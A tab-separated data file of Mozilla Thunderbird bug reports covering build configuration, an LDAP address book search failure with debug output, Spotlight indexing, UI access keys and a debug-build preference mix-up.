587989%TAB%1282010810%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Folder and Message Lists%TAB%Wrong text color on folder pane treechildren in selected status with new messages%TAB%Wrong text color on folder pane treechildren in selected status with new messagesIn Bug 581360 I forgot the treechildren in the folder pane when they have new messages and are selected. In unselected mode the text color is blue and in selected mode white. With this patch the text is left blue, which is better readable.
587986%TAB%1282006563%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Build Config%TAB%Use toolkit's l10n.mk in mail/locales/Makefile.in%TAB%Use toolkit's l10n.mk in mail/locales/Makefile.inToolkit implemented l10n.mk so that we can reduce the duplication of make file code when we doing l10n things.  As we recently managed to break locale builds due to missing a change made in toolkit's l10n.mk, I want to pick it up so that it doesn't happen again.  The basic work here is to match mail/locales/Makefile.in with mozilla/browser/locales/Makefile.in except for the differences in profile files and other areas.
586849%TAB%1281630285%TAB%246518%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Windows installer packaging changes in bug 556644 will break Thunderbird%TAB%Windows installer packaging changes in bug 556644 will break ThunderbirdJust a heads up - we're going to end up breaking anything that uses the toolkit windows installer code. I ported the changes for Firefox to Thunderbird and am waiting for a build to finish.
586770%TAB%1281612512%TAB%339434%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Account Manager%TAB%Missing extension points for the Account Provisioner.%TAB%Missing extension points for the Account Provisioner.While developing the Account Provisioner, I've found a couple of places where I need a little more flexibility than what we currently have.  So here's a patch to add them in.
585917%TAB%1281410214%TAB%328198%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Address Book%TAB%LDAP searching broken in comm-central%TAB%LDAP searching broken in comm-centralI'm unable to search LDAP for contacts:  Reproduce steps: - Toolbar->Address Book - Choose LDAP server from list of address books - type name to search input  Results: Nothing is found.   Expected: In TB 3.1.2 contact is found.  Output in terminal with debug enabled: JS Component Loader: ERROR file:///home/jan/src/2comm-central/mozilla/dist/bin/components/nsAbLDAPAttributeMap.js:355                      ReferenceError: XPCOMUtils is not defined WARNING: NS_ENSURE_SUCCESS(rv, rv) failed with result 0x80040154: file nsAbLDAPDirectory.cpp, line 694 WARNING: NS_ENSURE_SUCCESS(rv, rv) failed with result 0x80040154: file nsAbLDAPDirectory.cpp, line 347 WARNING: NS_ENSURE_SUCCESS(rv, rv) failed with result 0x80040154: file nsAbLDAPDirectory.cpp, line 191   Error console output (when clicked on the ldap server from list of address books): Error: An error occurred updating the cmd_delete command: [Exception... "'[JavaScript Error: "cards[i] is null" {file: "chrome://messenger/content/addressbook/abResultsPane.js" line: 158}]' when calling method: [nsIController::isCommandEnabled]"  nsresult: "0x80570021 (NS_ERROR_XPC_JAVASCRIPT_ERROR_WITH_DETAILS)"  location: "JS frame :: chrome://global/content/globalOverlay.js :: goUpdateCommand :: line 80"  data: yes] Source File: chrome://global/content/globalOverlay.js Line: 86
585308%TAB%1281157213%TAB%29811%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Message Compose Window%TAB%change access key for account settings to S to match main pane%TAB%change access key for account settings to S to match main panemain 3pane - Tools, S is the shortcut for Account settings compose - Tools, C is the shortcut for Account settings  Please alter to S in the compose pane so the keys match main pane
585168%TAB%1281095890%TAB%390402%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%OS Integration%TAB%Spotlight search fails when metadata importer (Thunderbird.mdimporter) is absent,Spotlight search fails when metadata importer plug-in (Thunderbird.mdimporter) is absent%TAB%Spotlight search fails when metadata importer (Thunderbird.mdimporter) is absent,Spotlight search fails when metadata importer plug-in (Thunderbird.mdimporter) is absentUser-Agent:       Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.125 Safari/533.4 Build Identifier: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.7) Gecko/20100713 Thunderbird/3.1.1  Without the Thunderbird.mdimporter (located here: https://bugzilla.mozilla.org/attachment.cgi?id=253622), Spotlight fails to return messages based on content searches.   Furthermore, this importer does not appear to be a part of the Mac distribution (as of Thunderbird 3.1.1), and must be searched for and installed separately.  There is no indication given by the program or documentation that such actions are required for the Spotlight search functionality to work.    Reproducible: Always  Steps to Reproduce: 1. Make sure Thunderbird.mdimporter is not installed.  (To do so search run "mdimport -L". check to make sure Thunderbird.mdimporter is not on the list) 2. Cleanly install Thunderbird, add an email account (I've only tried Gmail imap so far) 3. Make sure Spotlight indexing on, and that metadata are being stored properly in ~/Library/Caches/Metadata/Thunderbird/etc. 4. Find an email for which you have verified the metadata (i.e. .mozeml file) exists, and search for it based on sender, recipient, or message body. Actual Results:   Spotlight fails to return the message in the Spotlight search results.  Expected Results:   Spotlight should have returned the message.
584601%TAB%1280946511%TAB%287320%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%rights message displays at bottom of screen every time when running debug build%TAB%rights message displays at bottom of screen every time when running debug buildUser-Agent:       Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100723 Fedora/3.6.7-1.fc13 Firefox/3.6.7 Build Identifier: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100803 Fedora/3.1.1-1.fc13.jik.7 Thunderbird/3.1.1  Changeset 1878, checked in 2009-02-09 by Mark Banner, has this comment in mail/app/profile/all-thunderbird.js:  // Don't show the about:rights notification in debug or non-official builds.  However, the code right below the comment doesn't actually implement what the comment says. The code is:  #ifdef DEBUG pref("mail.rights.override", false); #endif #ifndef OFFICIAL_BUILD pref("mail.rights.override", true); #endif  Because mail.rights.override is set to false, when DEBUG is defined, this code causes the rights notification to be displayed always in debug builds, whereas the command says that it shouldn't.  Either the comment is wrong or the code is; personally, I'd opt to change the code, because I see no reason to display the rights notification every time a developer runs a debug build. It's just an unneeded annoyance. 
